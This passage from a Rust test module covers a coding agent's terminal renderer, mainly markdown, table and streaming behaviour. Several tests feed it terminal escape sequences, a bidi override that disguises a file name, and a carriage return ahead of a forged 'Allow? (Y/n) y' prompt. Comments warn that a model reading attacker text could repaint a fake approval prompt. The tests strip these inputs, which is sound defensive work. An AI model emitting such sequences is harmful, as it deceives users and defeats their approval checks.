        );
        assert_eq!(
            builtin_primary_param("read_file", &input).as_deref(),
            Some("/tmp")
        );
        assert_eq!(builtin_primary_param("unknown_tool", &input), None);
    }

    #[test]
    fn test_builtin_primary_param_missing() {
        let input = serde_json::json!({"other": "value"});
        assert_eq!(builtin_primary_param("execute_command", &input), None);
    }

    #[test]
    fn test_builtin_primary_param_render_image_from_scratchpad() {
        let input = serde_json::json!({"from_scratchpad": "frame4"});
        assert_eq!(
            builtin_primary_param("render_image", &input).as_deref(),
            Some("frame4")
        );
    }

    #[test]
    fn test_builtin_primary_param_render_image_inline_base64() {
        let input = serde_json::json!({"base64": "iVBOR..."});
        assert_eq!(
            builtin_primary_param("render_image", &input).as_deref(),
            Some("<inline base64>")
        );
    }

    #[test]
    fn test_builtin_primary_param_render_image_from_scratchpad_takes_precedence() {
        let input = serde_json::json!({"from_scratchpad": "frame4", "base64": "iVBOR..."});
        assert_eq!(
            builtin_primary_param("render_image", &input).as_deref(),
            Some("frame4")
        );
    }

    #[test]
    fn test_builtin_primary_param_render_image_empty() {
        let input = serde_json::json!({});
        assert_eq!(builtin_primary_param("render_image", &input), None);
    }

    #[test]
    fn test_schema_primary_param_string_value() {
        let schema = serde_json::json!({
            "type": "object",
            "properties": {"query": {"type": "string"}},
            "required": ["query"],
        });
        let input = serde_json::json!({"query": "best keyboards 2026"});
        assert_eq!(
            schema_primary_param(&schema, &input).as_deref(),
            Some("best keyboards 2026")
        );
    }

    #[test]
    fn test_schema_primary_param_array_of_strings() {
        let schema = serde_json::json!({
            "required": ["urls"],
        });
        let input = serde_json::json!({
            "urls": ["https://example.com", "https://other.example"],
        });
        assert_eq!(
            schema_primary_param(&schema, &input).as_deref(),
            Some("https://example.com, https://other.example")
        );
    }

    #[test]
    fn test_schema_primary_param_number_and_bool() {
        let schema = serde_json::json!({"required": ["count"]});
        let input = serde_json::json!({"count": 42});
        assert_eq!(schema_primary_param(&schema, &input).as_deref(), Some("42"));
        let schema = serde_json::json!({"required": ["enabled"]});
        let input = serde_json::json!({"enabled": true});
        assert_eq!(
            schema_primary_param(&schema, &input).as_deref(),
            Some("true")
        );
    }

    #[test]
    fn test_schema_primary_param_no_required_field() {
        let schema = serde_json::json!({
            "type": "object",
            "properties": {"query": {"type": "string"}},
        });
        let input = serde_json::json!({"query": "hello"});
        assert_eq!(schema_primary_param(&schema, &input), None);
    }

    #[test]
    fn test_schema_primary_param_required_key_absent_from_input() {
        let schema = serde_json::json!({"required": ["query"]});
        let input = serde_json::json!({"other_field": "value"});
        assert_eq!(schema_primary_param(&schema, &input), None);
    }

    #[test]
    fn test_schema_primary_param_empty_required_array() {
        let schema = serde_json::json!({"required": []});
        let input = serde_json::json!({"query": "hello"});
        assert_eq!(schema_primary_param(&schema, &input), None);
    }

    #[test]
    fn test_schema_primary_param_nested_object_skipped() {
        let schema = serde_json::json!({"required": ["config"]});
        let input = serde_json::json!({"config": {"nested": 1}});
        assert_eq!(schema_primary_param(&schema, &input), None);
    }

    #[test]
    fn test_resolve_primary_param_builtin_takes_precedence_over_schema() {
        // A tool that happens to share a built-in name: hardcoded map wins so the display stays
        // consistent with what users know.
        let schema = serde_json::json!({"required": ["path"]});
        let input = serde_json::json!({"command": "ls -la", "path": "/ignored"});
        assert_eq!(
            resolve_primary_param("execute_command", &input, Some(&schema)).as_deref(),
            Some("ls -la")
        );
    }

    #[test]
    fn test_resolve_primary_param_falls_back_to_schema_for_unknown_tool() {
        let schema = serde_json::json!({"required": ["query"]});
        let input = serde_json::json!({"query": "claude code"});
        assert_eq!(
            resolve_primary_param("exa__web_search_exa", &input, Some(&schema)).as_deref(),
            Some("claude code")
        );
    }

    #[test]
    fn test_resolve_primary_param_no_schema_no_builtin() {
        let input = serde_json::json!({"anything": "here"});
        assert_eq!(
            resolve_primary_param("unknown__mcp_tool", &input, None),
            None
        );
    }

    #[test]
    fn test_sanitize_strips_csi_and_c0() {
        // Clear-screen + home + bell, with ASCII text around.
        let input = "hello\x1b[2J\x1b[H\x07world\n";
        assert_eq!(sanitize_for_display(input), "helloworld\n");
    }

    #[test]
    fn test_sanitize_preserves_newline_tab_cr() {
        let input = "a\tb\nc\rd";
        assert_eq!(sanitize_for_display(input), "a\tb\nc\rd");
    }

    #[test]
    fn test_sanitize_strips_color_escape() {
        let input = "\x1b[31mred\x1b[0m";
        assert_eq!(sanitize_for_display(input), "red");
    }

    #[test]
    fn test_sanitize_strips_cursor_move() {
        let input = "\x1b[10;20H";
        assert_eq!(sanitize_for_display(input), "");
    }

    #[test]
    fn test_sanitize_preserves_unicode() {
        let input = "日本語 emoji \u{1F600}";
        assert_eq!(sanitize_for_display(input), "日本語 emoji \u{1F600}");
    }

    #[test]
    fn test_streaming_renderer_basic() {
        let mut renderer = StreamingRenderer::new(RenderMode::Termimad);
        renderer.push_delta("hello").unwrap();
        renderer.finish().unwrap();
    }

    #[test]
    fn test_streaming_renderer_strips_leading_newlines() {
        let mut renderer = StreamingRenderer::new(RenderMode::Termimad);
        renderer.push_delta("\n\nhello").unwrap();
        renderer.finish().unwrap();
    }

    /// A bidi override reorders a line without changing a byte of it, so stripping escapes is not
    /// enough on the one surface a model writes freely. `sanitize_to_line` and the MCP sanitiser
    /// have always dropped Unicode `Cf`; this was the one that did not, and it guards the biggest
    /// surface of the three.
    #[test]
    fn streamed_assistant_text_cannot_carry_bidi_overrides() {
        // RLO between a harmless prefix and a path, which renders the path reversed.
        let attack = "run \u{202e}txt.esriver\u{202c} now";
        let sanitised = sanitize_stream_text(attack);
        assert!(
            !sanitised.contains('\u{202e}') && !sanitised.contains('\u{202c}'),
            "format characters must not reach the terminal: {sanitised:?}",
        );
        // Ordinary text is untouched, including scripts that need no overrides to render.
        assert_eq!(sanitize_stream_text("日本語 ok"), "日本語 ok");
    }

    /// The sanitiser guards against reordering, not against invisible characters as such, and most
    /// of `Cf` is ordinary content in model prose. Filtering the whole category broke every one of
    /// these: the family renders as three separate people, the Persian word runs its letters
    /// together, and the Devanagari loses its conjunct form.
    #[test]
    fn streamed_assistant_text_keeps_the_joiners_real_words_are_spelled_with() {
        // ZWJ: a family emoji is one glyph only while the joiners survive.
        let family = "\u{1F468}\u{200D}\u{1F469}\u{200D}\u{1F467}";
        assert_eq!(sanitize_stream_text(family), family);

        // ZWNJ: Persian "می‌خواهم" is misspelled without it.
        let persian = "\u{645}\u{6CC}\u{200C}\u{62E}\u{648}\u{627}\u{647}\u{645}";
        assert_eq!(sanitize_stream_text(persian), persian);

        // ZWJ again, this time forcing a Devanagari conjunct.
        let devanagari = "\u{915}\u{94D}\u{200D}\u{937}";
        assert_eq!(sanitize_stream_text(devanagari), devanagari);

        // And the direction *marks*, which state a direction rather than override one, are
        // ordinary content in Hebrew and Arabic.
        assert_eq!(sanitize_stream_text("\u{200E}abc"), "\u{200E}abc");
    }

    /// Streamed assistant text is the largest model-controlled surface meka prints, and the
    /// markdown renderer is not a filter: termimad writes a compound's bytes verbatim. A model
    /// that has read attacker text could otherwise clear the screen and repaint a convincing
    /// approval prompt. Asserted on the buffer rather than through the terminal, so removing
    /// the sanitise call in `push_delta` fails this rather than merely changing what a human
    /// would have seen.
    #[test]
    fn streamed_assistant_text_cannot_carry_terminal_escapes() {
        let mut renderer = StreamingRenderer::new(RenderMode::Termimad);
        renderer
            .push_delta("before \u{1b}[2J\u{1b}[1;1H\u{1b}]0;pwned\u{7}\u{1b}[8mafter")
            .unwrap();

        assert!(
            !renderer.buffer.contains('\u{1b}'),
            "no ESC may reach the terminal: {:?}",
            renderer.buffer
        );
        assert!(
            renderer.buffer.contains("before") && renderer.buffer.contains("after"),
            "the prose itself must survive: {:?}",
            renderer.buffer
        );
    }

    /// A CSI sequence can straddle a chunk boundary, so the regex alone would miss it. The control
    /// filter is what actually closes this: with every ESC dropped, no sequence can form however
    /// the provider happens to split the stream.
    #[test]
    fn an_escape_split_across_two_deltas_cannot_reconstitute() {
        let mut renderer = StreamingRenderer::new(RenderMode::Termimad);
        renderer.push_delta("safe \u{1b}").unwrap();
        renderer.push_delta("[2Jrest").unwrap();

        assert!(!renderer.buffer.contains('\u{1b}'), "{:?}", renderer.buffer);
    }

    /// `\r` needs no escape sequence to forge UI: it returns the cursor to column zero, so a model
    /// can overwrite a line meka already printed. `\n` and `\t` are structural in markdown and only
    /// ever move the cursor forward, so they stay.
    ///
    /// Asserted on the helper rather than on the renderer's buffer: `push_delta` flushes as soon as
    /// it can, so a buffer-based version of this passes whether or not the sanitiser runs.
    #[test]
    fn streamed_assistant_text_drops_carriage_returns_but_keeps_layout() {
        assert_eq!(sanitize_stream_text("a\r\nb\tc"), "a\nb\tc");
        assert_eq!(
            sanitize_stream_text("\rAllow? (Y/n) y"),
            "Allow? (Y/n) y",
            "a lone CR must not survive to reposition the cursor"
        );
    }

    fn termimad_render(markdown: &str) -> String {
        let mut renderer = StreamingRenderer::new(RenderMode::Termimad).with_width(76);
        renderer.started = true;
        renderer.buffer = markdown.to_string();
        let mut output = renderer.take_termimad_output();
        let tail = std::mem::take(&mut renderer.buffer);
        output.push_str(&renderer.finish_termimad_output(tail.trim_end_matches('\n')));
        output
    }

    /// termimad's own `default_dark()` is defined entirely in `gray(n)`, which is what made this
    /// mode unreadable: every element rendered in the same handful of greyscale tones. Each element
    /// must now carry a distinct colour from the theme.
    #[test]
    fn test_markdown_skin_is_not_greyscale() {
        let rendered = termimad_render(
            "# Title\n\nText with **bold**, *italic*, and `code`.\n\n> quoted\n\n* item\n",
        );
        let colors = fg_color_set(&rendered);
        assert!(
            colors.len() >= 5,
            "expected a distinct colour per element; got {colors:?}",
        );
        // A greyscale colour has r == g == b; a skin that regressed to the default would be all of
        // them, so assert the palette actually carries hue.
        let has_hue = colors.iter().any(|color| {
            let parts: Vec<&str> = color.split(';').collect();
            parts.len() == 3 && !(parts[0] == parts[1] && parts[1] == parts[2])
        });
        assert!(has_hue, "every colour was greyscale: {colors:?}");
    }

    /// The theme's markdown rules are nested selectors (`text.html.markdown markup.raw.inline`),
    /// so resolving an element scope on its own silently yields the default foreground. Inline code
    /// is the one that exposes this, and it regressed exactly this way during development.
    #[test]
    fn test_inline_code_resolves_through_the_markdown_context() {
        let rendered = termimad_render("uses `inline_code` here\n");
        assert!(
            fg_color_set(&rendered).contains("236;53;51"),
            "inline code should take the theme's markup.raw.inline colour; got {:?}",
            fg_color_set(&rendered),
        );
    }

    /// minimad only understands `* ` as a list marker, and models write `-`, so without rewriting
    /// them every list rendered as literal dashes with no bullet and no indentation.
    #[test]
    fn test_dash_and_plus_lists_render_as_bullets() {
        let rendered = termimad_render("- alpha\n+ beta\n");
        assert_eq!(
            rendered.matches('\u{2022}').count(),
            2,
            "both markers should become bullets; got {rendered:?}",
        );
    }

    /// Every CommonMark bullet marker has to render as a list, and the things that merely look
    /// like one must not. These were the cases the old text-rewriting approach had to special-case
    /// by hand; the parser gets them from the spec.
    #[test]
    fn test_bullet_markers_and_their_lookalikes() {
        let bullets =
            strip_ansi_escapes(&termimad_stream("- alpha\n+ beta\n* gamma\n", usize::MAX));
        assert_eq!(
            bullets.matches('\u{2022}').count(),
            3,
            "all three markers are bullets in CommonMark; got {bullets:?}",
        );

        let rule = strip_ansi_escapes(&termimad_stream("above\n\n---\n\nbelow\n", usize::MAX));
        assert!(
            !rule.contains('\u{2022}') && rule.contains("above") && rule.contains("below"),
            "`---` is a horizontal rule, not a bullet; got {rule:?}",
        );

        let code = strip_ansi_escapes(&termimad_stream("```sh\n- not a bullet\n```\n", usize::MAX));
        assert!(
            code.contains("- not a bullet"),
            "a dash inside a fence is code, not a list; got {code:?}",
        );
    }

    /// Nesting comes from the parser's list depth rather than from counting leading spaces, so both
    /// of the conventional indent widths land on the same level.
    #[test]
    fn test_nested_lists_indent_by_depth() {
        for document in ["- top\n  - nested\n", "- top\n    - nested\n"] {
            let rendered = strip_ansi_escapes(&termimad_stream(document, usize::MAX));
            let lines: Vec<&str> = rendered
                .lines()
                .filter(|l| l.contains('\u{2022}'))
                .collect();
            assert_eq!(lines.len(), 2, "expected two items from {document:?}");
            let indent = |line: &str| line.len() - line.trim_start().len();
            assert!(
                indent(lines[1]) > indent(lines[0]),
                "the nested item must be indented further; got {lines:?} from {document:?}",
            );
        }
    }

    /// The reason the old rewrite was dangerous in a coding agent: underscores are identifiers far
    /// more often than emphasis, and CommonMark says an intraword underscore is literal.
    #[test]
    fn test_underscore_emphasis_follows_commonmark() {
        let emphasised = strip_ansi_escapes(&termimad_stream(
            "__bold text__ and _italic text_ here\n",
            usize::MAX,
        ));
        assert!(
            !emphasised.contains('_'),
            "underscore emphasis markers must be consumed, not shown; got {emphasised:?}",
        );
        assert!(
            emphasised.contains("bold text") && emphasised.contains("italic text"),
            "the emphasised words must survive; got {emphasised:?}",
        );

        let identifiers = strip_ansi_escapes(&termimad_stream(
            "call snake_case_name and foo_bar here\n",
            usize::MAX,
        ));
        assert!(
            identifiers.contains("snake_case_name") && identifiers.contains("foo_bar"),
            "intraword underscores are literal; got {identifiers:?}",
        );
    }

    /// termimad paints a fenced block in one flat colour regardless of language. Routing blocks
    /// through the syntect renderer the other mode already uses is the whole point of the change.
    #[test]
    fn test_fenced_code_block_is_syntax_highlighted() {
        let rendered = termimad_render("```rust\nfn main() { let x = 42; }\n```\n");
        assert!(
            fg_color_set(&rendered).len() >= 4,
            "a highlighted block has several colours, not one flat run; got {:?}",
            fg_color_set(&rendered),
        );
    }

    /// Regression guard: the previous flush split the buffer on every `\n\n` with no fence guard,
    /// so a code block containing a blank line was cut in half and each half rendered separately,
    /// leaving the fence unbalanced.
    #[test]
    fn test_code_block_containing_a_blank_line_survives() {
        let rendered = termimad_render("```rust\nfn a() {}\n\nfn b() {}\n```\n\nafter\n");
        let plain = strip_ansi_escapes(&rendered);
        assert!(
            plain.contains("fn a() {}") && plain.contains("fn b() {}"),
            "both halves of the block must render; got {plain:?}",
        );
        assert!(
            plain.contains("after"),
            "content after the block must still render; got {plain:?}",
        );
    }

    /// An interrupted or truncated response can leave a fence open. Its lines are still content.
    #[test]
    fn test_unterminated_code_block_still_renders() {
        let rendered = termimad_render("```rust\nfn main() {}\n");
        assert!(
            strip_ansi_escapes(&rendered).contains("fn main() {}"),
            "an unclosed block must not swallow its body; got {rendered:?}",
        );
    }

    /// Wrapping wide tables is the reason to pick this mode over syntect, so it has to survive the
    /// restructuring.
    #[test]
    fn test_wide_table_still_wraps() {
        let rendered = termimad_render(
            "| Col | Description |\n|---|---|\n| a | one two three four five six seven eight \
             nine ten eleven twelve thirteen |\n\n",
        );
        let plain = strip_ansi_escapes(&rendered);
        assert!(
            plain.lines().count() >= 4,
            "a long cell should wrap onto extra rows; got {plain:?}",
        );
        assert!(
            plain.lines().all(|line| line.chars().count() <= 80),
            "no rendered line may exceed the render width; got {plain:?}",
        );
    }

    /// A turn whose final delta ends in a newline leaves the buffer empty while a table or an
    /// unterminated fence is still pending. Skipping the drains in that case loses a reply's
    /// trailing table completely. Asserts on the renderer's own state because the drain itself
    /// writes to stdout.
    ///
    /// The cases are listed per mode because the two buffer differently: syntect collects table
    /// rows in `raw_table_lines`, while termimad hands tables to minimad and holds partial ones in
    /// `buffer`.
    #[test]
    fn test_finish_drains_pending_state_when_the_buffer_is_empty() {
        let cases = [
            (RenderMode::Syntect, "| a | b |\n"),
            (RenderMode::Syntect, "```rust\nfn main() {}\n"),
            (RenderMode::Termimad, "```rust\nfn main() {}\n"),
        ];
        for (mode, input) in cases {
            let mut renderer = StreamingRenderer::new(mode);
            renderer.push_delta(input).unwrap();
            assert!(
                renderer.buffer.is_empty()
                    && (!renderer.raw_table_lines.is_empty()
                        || !renderer.code_block_lines.is_empty()),
                "{mode} / {input:?}: precondition is an empty buffer with content still pending",
            );
            renderer.finish().unwrap();
            assert!(
                renderer.raw_table_lines.is_empty() && renderer.code_block_lines.is_empty(),
                "{mode} / {input:?}: finish must render pending content, not drop it",
            );
        }
    }

    /// Drive the termimad path the way `push_delta`/`finish` do, but returning the output so it
    /// can be asserted on. `chunk_chars` splits the input the way a stream would.
    fn termimad_stream(markdown: &str, chunk_chars: usize) -> String {
        let mut renderer = StreamingRenderer::new(RenderMode::Termimad).with_width(76);
        renderer.started = true;
        let mut output = String::new();
        let chars: Vec<char> = markdown.chars().collect();
        for chunk in chars.chunks(chunk_chars.max(1)) {
            renderer.buffer.push_str(&chunk.iter().collect::<String>());
            output.push_str(&renderer.take_termimad_output());
        }
        let tail = std::mem::take(&mut renderer.buffer);
        output.push_str(&renderer.finish_termimad_output(tail.trim_end_matches('\n')));
        output
    }

    /// The agent substitutes a bracketed stand-in when a turn produces no content (see
    /// `agent::empty_turn_notice`) and streams it as ordinary assistant text, so it lands in the
    /// markdown renderer like any other prose. A leading `[` opens a link in CommonMark, and these
    /// notices are the user's only signal that the turn happened at all, so a parser that swallowed
    /// the brackets - or the line - would turn a reported failure back into a silent one.
    #[test]
    fn termimad_preserves_bracketed_empty_turn_notices() {
        for notice in [
            "[The model returned an empty response.]",
            "[The model returned an empty response (stop reason: pause_turn).]",
            "[The model declined to respond to this request.]",
            "[The model reached its output limit before producing a response.]",
        ] {
            assert_eq!(
                termimad_stream(notice, 4096).trim_end(),
                notice,
                "the stand-in notice must render verbatim"
            );
        }
    }

    /// Documents that between them cover every branch of the termimad flush: prose, headings,
    /// lists, tables, fences (closed, unterminated, containing blank lines), and the adjacencies
    /// between them. Tokens are short and unique so wrapping can't split one.
    const STREAMING_CORPUS: &[&str] = &[
        "t01 t02 t03\n\nt04 t05\n",
        "## t06\n\nt07 **t08** *t09* `t10`\n",
        "- t11\n- t12\n  - t13\n    - t14\n",
        "| t15 | t16 |\n|---|---|\n| t17 | t18 |\n\nt19\n",
        "```rust\nlet t20 = 1;\n\nlet t21 = 2;\n```\n\nt22\n",
        "```\nt23\n",
        // A line that starts with `|` but doesn't end with one sits between prose and a fence:
        // this is the shape that can spin the flush loop forever.
        "| t24\n```rust\nlet t25 = 3;\n```\n",
        "```rust\nlet t26 = 4;\n```\n| t27 | t28 |\n|---|---|\n| t29 | t30 |\n\n",
        "> t31\n\n---\n\nt32\n",
        "t33\n\n### t34\n\n- t35\n\n```sh\necho t36\n```\n\nt37\n",
        // Ends on a table row with no trailing blank line, so the rows are still pending when the
        // turn finishes. This is the shape that rendered as one broken single-row table per line.
        "t38\n\n| t39 | t40 |\n|---|---|\n| t41 | t42 |\n",
        // A code block whose body would be mistaken for markdown if the fence state were lost.
        "```sh\n# t43\nls t44\n```\n",
    ];

    /// Every byte pushed has to come out exactly once, whatever offsets the stream is chopped at.
    /// Chunking at one character per delta puts a split inside every fence, table row, and marker.
    #[test]
    fn test_termimad_streaming_preserves_content_at_every_chunk_boundary() {
        for document in STREAMING_CORPUS {
            let tokens: Vec<&str> = document
                .split(|c: char| !c.is_ascii_alphanumeric())
                .filter(|word| word.len() == 3 && word.starts_with('t'))
                .collect();
            assert!(
                !tokens.is_empty(),
                "corpus entry has no tokens: {document:?}"
            );

            for chunk in [1, 2, 3, 5, 11, usize::MAX] {
                let rendered = strip_ansi_escapes(&termimad_stream(document, chunk));
                for token in &tokens {
                    assert_eq!(
                        rendered.matches(token).count(),
                        1,
                        "{token} should appear exactly once for chunk size {chunk} of \
                         {document:?}; got {rendered:?}",
                    );
                }
            }
        }
    }

    /// After one pass, everything the flush could legally render must be gone from the buffer.
    ///
    /// Two things qualify. Prose is settled once a blank line follows it, so no blank line may
    /// remain. A complete fenced block is self-delimiting and is taken the moment its opening fence
    /// line is whole, so no complete fence line may remain either. What is allowed to stay is the
    /// final open block: a trailing table, an unfinished paragraph, a partial line.
    ///
    /// Stopping earlier than that is the failure this guards: it hangs the flush loop, and even
    /// with the loop's progress check it silently defers the rest of the turn to `finish`, so
    /// output arrives in one burst at the end instead of streaming.
    #[test]
    fn test_flush_consumes_everything_it_can_in_one_pass() {
        for document in STREAMING_CORPUS {
            let mut renderer = StreamingRenderer::new(RenderMode::Termimad).with_width(76);
            renderer.started = true;
            renderer.buffer = document.to_string();
            renderer.take_termimad_output();
            let left = renderer.buffer.clone();
            assert!(
                !left.contains("\n\n"),
                "settled prose left unrendered in {left:?} from {document:?}",
            );
            assert!(
                !left
                    .lines()
                    .any(|line| is_code_fence(line) && left.contains(&format!("{line}\n"))),
                "a complete fence line left unconsumed in {left:?} from {document:?}",
            );
        }
    }

    /// Whatever the mode and however the stream is chopped, a finished turn must leave nothing
    /// buffered: anything still held after `finish` is content that was never shown. This is the
    /// invariant the old `finish` broke, dropping a table when the last delta ended in a newline.
    /// Runs every mode, including `Raw` and `Silent`, which share the same buffers.
    #[test]
    fn test_finish_leaves_nothing_buffered_in_any_mode() {
        let modes = [
            RenderMode::Syntect,
            RenderMode::Termimad,
            RenderMode::Raw,
            RenderMode::Silent,
        ];
        for document in STREAMING_CORPUS {
            for mode in modes {
                for chunk in [1, 3, 17, usize::MAX] {
                    let mut renderer = StreamingRenderer::new(mode);
                    let chars: Vec<char> = document.chars().collect();
                    for piece in chars.chunks(chunk.max(1)) {
                        renderer
                            .push_delta(&piece.iter().collect::<String>())
                            .expect("push_delta");
                    }
                    renderer.finish().expect("finish");
                    assert!(
                        renderer.buffer.is_empty()
                            && renderer.raw_table_lines.is_empty()
                            && renderer.code_block_lines.is_empty(),
                        "{mode} left content buffered after finish for chunk {chunk} of \
                         {document:?}: buffer={:?} table={:?} code={:?}",
                        renderer.buffer,
                        renderer.raw_table_lines,
                        renderer.code_block_lines,
                    );
                }
            }
        }
    }

    /// minimad sizes table columns per document, so a table handed to it one row at a time becomes
    /// a series of single-row tables: columns don't line up, the separator row renders as its own
    /// empty box, and nothing wraps. A reply ending in a table hits this, because a trailing table
    /// is deliberately held back for the stream to finish.
    #[test]
    fn test_table_at_end_of_reply_renders_as_one_table() {
        let rendered = strip_ansi_escapes(&termimad_stream(
            "Comparison:\n\n| Option | Notes |\n|---|---|\n| fast | skips validation entirely |\n\
             | safe | revalidates everything first |\n",
            usize::MAX,
        ));
        // One table means one separator row, and every row the same width.
        assert_eq!(
            rendered.matches('\u{251c}').count(),
            1,
            "expected a single separator row; got {rendered:?}",
        );
        let widths: std::collections::BTreeSet<usize> = rendered
            .lines()
            .filter(|line| line.contains('\u{2502}'))
            .map(|line| line.chars().count())
            .collect();
        assert_eq!(
            widths.len(),
            1,
            "every row of one table is the same width; got {widths:?} from {rendered:?}",
        );
    }

    /// `normalize_spacing` re-derives fence state from the buffer, but the flush consumes the
    /// opening fence into `code_block_lines` first, so the buffer alone looks like top-level
    /// markdown. Without being told, it treats a `#` line in a shell snippet as a heading and
    /// inserts a blank line into the user's code.
    #[test]
    fn test_code_block_body_is_not_reflowed_as_markdown() {
        for mode in [RenderMode::Termimad, RenderMode::Syntect] {
            let mut renderer = StreamingRenderer::new(mode);
            renderer.push_delta("```sh\n").expect("fence");
            renderer.push_delta("# comment\nls -la\n").expect("body");
            assert_eq!(
                renderer.code_block_lines,
                vec!["```sh", "# comment", "ls -la"],
                "{mode} injected markdown spacing into a code block body",
            );
        }
    }

    /// Blocks have to be separated by a blank line. minimad renders a flat list of lines with no
    /// concept of a block, so without an explicit empty line a whole reply renders as one slab.
    #[test]
    fn test_blocks_are_separated_by_blank_lines() {
        let rendered = strip_ansi_escapes(&termimad_stream(
            "## Title\n\nA paragraph.\n\n- an item\n\nAnother paragraph.\n",
            usize::MAX,
        ));
        let blanks = rendered
            .lines()
            .filter(|line| line.trim().is_empty())
            .count();
        assert!(
            blanks >= 3,
            "expected a blank line between each pair of blocks; got {rendered:?}",
        );
        assert!(
            !rendered.ends_with("\n\n"),
            "the last block must not trail a separator; got {rendered:?}",
        );
    }

    /// A paragraph written across several source lines is one paragraph, so it reflows to the
    /// terminal width rather than keeping the model's line breaks. Line-at-a-time rendering could
    /// not do this.
    #[test]
    fn test_multi_line_paragraph_reflows() {
        let source = "alpha bravo charlie\ndelta echo foxtrot\ngolf hotel india\n\n";
        let rendered = strip_ansi_escapes(&termimad_stream(source, usize::MAX));
        let body: Vec<&str> = rendered
            .lines()
            .filter(|line| !line.trim().is_empty())
            .collect();
        assert_eq!(
            body.len(),
            1,
            "three short source lines are one paragraph at width 76; got {body:?}",
        );
        assert!(body[0].contains("alpha") && body[0].contains("india"));
    }

    /// Ordered lists have no minimad equivalent. Rendering them as bullets would discard the
    /// numbering, which is the whole content of a numbered instruction.
    #[test]
    fn test_ordered_lists_keep_their_numbers() {
        let rendered = strip_ansi_escapes(&termimad_stream("1. first\n2. second\n\n", usize::MAX));
        assert!(
            rendered.contains("1. first") && rendered.contains("2. second"),
            "numbering must survive; got {rendered:?}",
        );
        assert!(
            !rendered.contains('\u{2022}'),
            "an ordered item is not a bullet; got {rendered:?}",
        );
    }

    /// A terminal can't follow a link, so the destination is shown next to the text instead of the
    /// raw `[text](url)` minimad would have printed verbatim.
    #[test]
    fn test_links_render_text_and_destination() {
        let rendered = strip_ansi_escapes(&termimad_stream(
            "see [the docs](https://example.com) now\n\n",
            usize::MAX,
        ));
        assert!(
            rendered.contains("the docs") && rendered.contains("https://example.com"),
            "both the text and the target should show; got {rendered:?}",
        );
        assert!(
            !rendered.contains("]("),
            "the markdown syntax itself must not survive; got {rendered:?}",
        );
    }

    /// Emphasis nests, and the inner span closing must not end the outer one.
    #[test]
    fn test_nested_emphasis_survives() {
        let rendered = strip_ansi_escapes(&termimad_stream(
            "**bold with *inner* tail**\n\n",
            usize::MAX,
        ));
        assert!(
            rendered.contains("bold with inner tail"),
            "markers consumed, text intact; got {rendered:?}",
        );
    }

    /// The default reaches every path that does not name a mode, so it is worth pinning rather than
    /// inheriting from whichever variant happens to be declared first.
    #[test]
    fn test_render_mode_default() {
        assert_eq!(RenderMode::default(), RenderMode::Termimad);
    }

    /// With stdout redirected there is no width to reflow to, and `termimad::terminal_size()`
    /// answers with a 50-column fallback. Wrapping an answer that narrowly on its way into a file
    /// is worse than not wrapping it, and this is the default mode now, so every piped run would
    /// hit it. Tests run without a terminal, which is exactly the case being pinned.
    #[test]
    fn test_termimad_does_not_reflow_without_a_terminal() {
        let sentence = "word ".repeat(60);
        let mut renderer = StreamingRenderer::new(RenderMode::Termimad);
        renderer.started = true;
        renderer.buffer = sentence;
        let rendered = renderer.finish_termimad_output(renderer.buffer.clone().trim_end());

        let longest = rendered
            .lines()
            .map(|line| strip_ansi_escapes(line).chars().count())
            .max()
            .unwrap_or(0);
        assert!(
            longest > 50,
            "a redirected run must not be hard-wrapped to the 50-column fallback; longest line \
             was {longest}",
        );
    }

    #[test]
    fn test_render_mode_parses_syntect_only() {
        assert_eq!("syntect".parse(), Ok(RenderMode::Syntect));
        assert_eq!("rich".parse(), Ok(RenderMode::Termimad));
        // The same value has to parse out of `config.toml` too. It did not: `FromStr` took the
        // alias and serde did not, so a documented alias worked on the flag and errored in the
        // file.
        #[derive(serde::Deserialize)]
        struct Display {
            render_mode: RenderMode,
        }
        let parsed: Display = toml::from_str("render_mode = \"rich\"")
            .expect("serde must take the alias the flag and the env var already took");
        assert_eq!(parsed.render_mode, RenderMode::Termimad);
        assert_eq!(RenderMode::Syntect.to_string(), "syntect");
        // A name that isn't a mode errors rather than silently falling back to the default, so a
        // user who asks for a renderer meka doesn't have hears about it.
        assert!("bat".parse::<RenderMode>().is_err());
        assert!("nope".parse::<RenderMode>().is_err());
    }

    /// The config tier rejects the same names the flag tier does. A `render_mode` that isn't a mode
    /// has to fail at load rather than deserialize into the default, which would leave the user
    /// staring at a renderer they didn't ask for with nothing to explain it.
    #[test]
    fn test_render_mode_config_rejects_unknown_names() {
        assert_eq!(
            serde_json::from_str::<RenderMode>("\"syntect\"").unwrap(),
            RenderMode::Syntect,
        );
        assert!(serde_json::from_str::<RenderMode>("\"bat\"").is_err());
    }

    #[test]
    fn test_is_table_line() {
        assert!(is_table_line("| A | B |"));
        assert!(is_table_line("|---|---|"));
        assert!(is_table_line("| single |"));
        assert!(!is_table_line("|"));
        assert!(!is_table_line("not a table"));
        assert!(!is_table_line("| no trailing pipe"));
    }

    #[test]
    fn test_parse_table_row() {
        let cells = parse_table_row("| Alpha | Beta | Gamma |");
        assert_eq!(cells, vec!["Alpha", "Beta", "Gamma"]);
    }

    #[test]
    fn test_parse_table_row_no_spaces() {
        let cells = parse_table_row("|A|B|C|");
        assert_eq!(cells, vec!["A", "B", "C"]);
    }

    #[test]
    fn test_is_separator_row() {
        assert!(is_separator_row(&[
            "---".to_string(),
            "----".to_string(),
            "---".to_string()
        ]));
        assert!(is_separator_row(&[":--".to_string(), ":-:".to_string()]));
        assert!(!is_separator_row(&["Name".to_string(), "---".to_string()]));
    }

    #[test]
    fn test_format_table_alignment() {
        let lines = vec![
            "| Name | Value |".to_string(),
            "|------|-------|".to_string(),
            "| A | 100 |".to_string(),
            "| Beta | 2 |".to_string(),
        ];
        let result = format_table(&lines);
        assert_eq!(result.len(), 4);

        // All rows should have the same length
        let first_len = result[0].len();
        for (index, row) in result.iter().enumerate() {
            assert_eq!(
                row.len(),
                first_len,
                "row {} has length {} but expected {}",
                index,
                row.len(),
                first_len
            );
        }

        // Check content is padded
        assert_eq!(result[0], "| Name | Value |");
        assert_eq!(result[2], "| A    | 100   |");
        assert_eq!(result[3], "| Beta | 2     |");
    }

    #[test]
    fn test_format_table_wide_columns() {
        let lines = vec![
            "| # | Name | Type | Status | Score |".to_string(),
            "|---|------|------|--------|-------|".to_string(),
            "| 1 | Alpha | Primary | Pass | 98.5 |".to_string(),
            "| 2 | Beta | Secondary | Warn | 75.0 |".to_string(),
            "| 3 | Gamma | Primary | Pass | 91.2 |".to_string(),
        ];
        let result = format_table(&lines);
        let first_len = result[0].len();
        for (index, row) in result.iter().enumerate() {
            assert_eq!(
                row.len(),
                first_len,
